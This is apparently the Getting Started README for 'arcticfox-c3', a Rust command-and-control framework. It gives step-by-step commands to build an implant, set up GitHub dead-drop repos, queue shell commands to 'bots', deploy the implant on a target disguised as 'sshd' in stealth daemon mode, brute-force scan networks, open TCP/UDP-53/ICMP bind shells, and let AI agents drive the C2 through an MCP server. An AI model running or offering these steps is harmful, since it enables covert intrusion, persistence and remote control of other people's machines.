# Getting Started

## Prerequisites

- Rust 1.96+ (edition 2024)
- Linux (for io_uring, ICMP bind shell, stealth features)
- Git

## Install Rust

```bash
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y
source "$HOME/.cargo/env"
```

## Build

```bash
git clone https://github.com/s-b-repo/arcticfox-c3
cd arcticfox-c3
cargo build --release
```

Binaries land in `target/release/`:
- `arcticfox-agent` — C2 implant
- `arcticfox-api` — REST API server
- `arcticfox-control` — operator CLI
- `arcticfox-scan` — network scanner
- `arcticfox-mcp` — AI agent MCP server
- `arcticfox-bindshell` — multi-protocol bind shell

## Quick Start: Full C2 Setup

### 1. Start API server
```bash
./target/release/arcticfox-api
# Prints admin + lints tokens on first run
```

### 2. Add dead-drop repos
```bash
TOKEN="<admin-token>"
curl -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"repo":"gh:youruser/c2-repo"}' \
  http://localhost:7443/api/admin/repos
```

### 3. Queue commands
```bash
curl -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"cmd":"shell whoami"}' \
  http://localhost:7443/api/admin/commands
```

### 4. Push to repos
```bash
curl -X POST -H "Authorization: Bearer $TOKEN" \
  http://localhost:7443/api/admin/push
```

### 5. Deploy implant on target
```bash
./arcticfox-agent agent -r gh:youruser/c2-repo --daemon --stealth-name sshd
```

### 6. Monitor bots
```bash
curl -H "Authorization: Bearer $TOKEN" \
  http://localhost:7443/api/admin/stats
```

## Interactive Control Shell

```bash
./arcticfox-control
ctrl> add gh:user/repo
ctrl> cmd shell uname -a
ctrl> push
ctrl> status
```

## Scan Network

```bash
./arcticfox-scan -T 192.168.1.0/24 --brute
./arcticfox-scan --random
```

## MCP (AI Control)

```bash
./arcticfox-mcp --tier 2          # stdio mode, operator tier
./arcticfox-mcp --tier 0 --transport http  # HTTP, recon-only
```

## Bind Shell

```bash
./arcticfox-bindshell --key <64-hex-chars> --tcp-addr 0.0.0.0:4444 --udp-addr 0.0.0.0:53 --icmp
```
